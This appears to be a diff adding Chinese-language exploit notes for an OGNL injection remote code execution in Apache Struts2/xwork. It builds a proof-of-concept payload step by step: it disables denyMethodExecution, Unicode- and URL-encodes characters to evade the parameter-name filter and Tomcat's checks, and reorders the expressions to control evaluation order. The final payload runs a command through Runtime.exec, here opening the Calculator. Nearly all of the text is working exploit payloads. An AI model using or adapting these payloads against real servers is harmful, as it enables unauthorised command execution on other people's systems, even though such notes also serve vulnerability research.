@@ -1,0 +1,20 @@
+初始: ('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='open -a Calculator.app')('racerz')
+
+绕过点1: context 中的 xwork.MethodAccessor.denyMethodExecution 值需要为true才可以执行解释AST调用方法
+('#context[\'xwork.MethodAccessor.denyMethodExecution\']=false')(racerz)(racerz)&('@java.lang.Runtime@'+'getRuntime().exec(#aa)')(#aa='open -a Calculator.app')('racerz')
+
+绕过点2: acceptableName方法中会利用正则过滤参数名中的非法字符# : = ,
+利用：OGNL解析支持Unicode编码
+引号直接URL编码即可
+(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(racerz)(racerz)&(%27@java.lang.Runtime@%27+%27getRuntime().exec(\u0023aa)%27)(\u0023aa\u003d%27open%20-a%20Calculator.app%27)(%27racerz%27) 
+
+绕过点3: @静态方法优先级高会先执行，所以改成赋值的方式；treeMap内部排序以key升序方式排列
+(%27\u0023context[\%27xwork.MethodAccessor.denyMethodExecution\%27]\u003dfalse%27)(racerz)(racerz)&(%27\u0023racerz\u003d@java.lang.Runtime@getRuntime().exec(\u0023aa)%27)(\u0023aa\u003d%27open%20-a%20Calculator.app%27)(%27racerz%27)
+
+绕过点4：高版本tomcat会受特殊字符的影响而返回4xx
+针对特殊字符采用url编码
+最终POC
+
+(%27%5Cu0023context%5B%5C%27xwork.MethodAccessor.denyMethodExecution%5C%27%5D%5Cu003dfalse%27)(racerz)(racerz)&('%5Cu0040java.lang.Runtime%40'%2B'getRuntime().exec(%5Cu0023aa)')(%5Cu0023aa%5Cu003d'open%5Cu0020-a%5Cu0020Calculator.app')('racerz')
+
+
